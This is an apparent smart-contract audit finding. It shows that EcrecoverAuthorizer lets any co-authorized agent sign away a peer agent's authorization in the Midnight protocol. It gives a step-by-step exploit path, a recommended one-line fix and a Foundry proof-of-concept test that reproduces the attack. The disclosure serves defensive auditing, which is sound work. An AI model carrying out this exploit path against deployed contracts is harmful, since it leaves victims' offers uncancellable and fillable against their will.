### Title
Co-authorized agent can deauthorize peer agents via `EcrecoverAuthorizer.setIsAuthorized` - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary

`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any agent already authorized by the `authorization.authorizer` in Midnight, not only from the authorizer themselves. This lets a co-authorized attacker sign an `Authorization` struct that sets `isAuthorized=false` for a peer agent (e.g., a `setConsumedAgent` responsible for cancelling offers), stripping that agent's ability to call `Midnight.setConsumed` on the victim's behalf and leaving the victim's offers permanently active and fillable.

### Finding Description

**Root cause — `EcrecoverAuthorizer.sol` line 33-36:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The second branch allows any address that `authorization.authorizer` has already authorized in Midnight to act as a valid signer for *any* `Authorization` struct, including ones that revoke other agents.

**Exact exploit path:**

Preconditions (all set by victim, all realistic):
- `isAuthorized[victim][ecrecoverAuthorizer] = true` — victim opted into signature-based auth
- `isAuthorized[victim][setConsumedAgent] = true` — victim delegated offer-cancellation
- `isAuthorized[victim][attacker] = true` — victim granted attacker some other delegation

Steps:
1. Attacker constructs `Authorization { authorizer: victim, authorized: setConsumedAgent, isAuthorized: false, nonce: nonce[victim], deadline: T+1 }`.
2. Attacker signs the EIP-712 digest with **their own private key**.
3. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
4. `ecrecover` returns `attacker`; check at line 34 evaluates `IMidnight(MIDNIGHT).isAuthorized(victim, attacker)` → `true` → **passes**.
5. `EcrecoverAuthorizer` calls `Midnight.setIsAuthorized(setConsumedAgent, false, victim)` (line 46-47).
6. `Midnight.setIsAuthorized` check at line 732: `isAuthorized[victim][ecrecoverAuthorizer]` → `true` → **passes**.
7. State: `isAuthorized[victim][setConsumedAgent] = false`.

Now `setConsumedAgent` calls `Midnight.setConsumed(group, type(uint256).max, victim)`:
- Line 724: `isAuthorized[victim][setConsumedAgent]` → `false` → **reverts with `Unauthorized`**.

No existing check prevents this. The nonce consumed is `nonce[victim]`, which the attacker can read on-chain. The attacker needs no knowledge of the victim's private key. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Impact Explanation

`setConsumedAgent` can no longer call `Midnight.setConsumed(group, type(uint256).max, victim)` to cancel victim's offers. All offers in the targeted group remain active and fillable, violating the invariant that offers cannot be filled after cancellation. Any taker can continue to fill those offers up to their original limits, causing unintended credit/debt changes for the victim.

### Likelihood Explanation

Preconditions are common: any user who uses `EcrecoverAuthorizer` for signature-based delegation (requiring `isAuthorized[victim][ecrecoverAuthorizer]=true`) and has more than one authorized agent is vulnerable. The attacker only needs to be one of those agents — a role that could be granted to a counterparty, a relayer, or any other protocol participant. The attack is free (no capital required), repeatable (each deauthorization consumes one nonce but the attacker can repeat if the victim re-authorizes), and fully on-chain with no off-chain coordination.

### Recommendation

Remove the delegated-signer branch from `EcrecoverAuthorizer.setIsAuthorized`. Only the `authorization.authorizer` themselves should be able to sign authorization changes:

```solidity
// Before
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After
require(signer == authorization.authorizer, Unauthorized());
```

This preserves the permissionless submission model (anyone can *submit* the transaction) while ensuring only the authorizer can *sign* changes to their own authorization table. [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IMidnight} from "../src/interfaces/IMidnight.sol";

contract DeauthorizeAgentPoC is BaseTest {
    function testAttackerDeauthorizesSetConsumedAgent() public {
        // --- Setup ---
        address victim = borrower;
        (address setConsumedAgent, uint256 agentKey) = makeAddrAndKey("setConsumedAgent");
        (address attacker,  uint256 attackerKey)     = makeAddrAndKey("attacker");
        privateKey[attacker] = attackerKey;

        // Victim opts into EcrecoverAuthorizer
        vm.prank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

        // Victim authorizes setConsumedAgent for offer cancellation
        vm.prank(victim);
        midnight.setIsAuthorized(setConsumedAgent, true, victim);

        // Victim authorizes attacker for some other purpose
        vm.prank(victim);
        midnight.setIsAuthorized(attacker, true, victim);

        // Sanity: setConsumedAgent can currently cancel offers
        assertEq(midnight.isAuthorized(victim, setConsumedAgent), true);

        // --- Attack ---
        // Attacker builds an Authorization to revoke setConsumedAgent, signed with attacker's key
        Authorization memory auth = Authorization({
            authorizer:   victim,
            authorized:   setConsumedAgent,
            isAuthorized: false,
            nonce:        ecrecoverAuthorizer.nonce(victim), // readable on-chain
            deadline:     block.timestamp + 1 days
        });

        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                                                   block.chainid,
                                                   address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Attacker submits — no victim involvement
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // --- Assertions ---
        // setConsumedAgent is now deauthorized
        assertEq(midnight.isAuthorized(victim, setConsumedAgent), false);

        // setConsumedAgent's cancellation call now reverts
        bytes32 group = bytes32(uint256(1));
        vm.prank(setConsumedAgent);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setConsumed(group, type(uint256).max, victim);
    }
}
```

Expected: the final `setConsumed` call reverts with `Unauthorized`, confirming the victim's offer-cancellation agent has been silently stripped by a co-authorized peer.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-47)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L723-724)
```text
    function setConsumed(bytes32 group, uint256 amount, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

**File:** src/Midnight.sol (L731-734)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
```
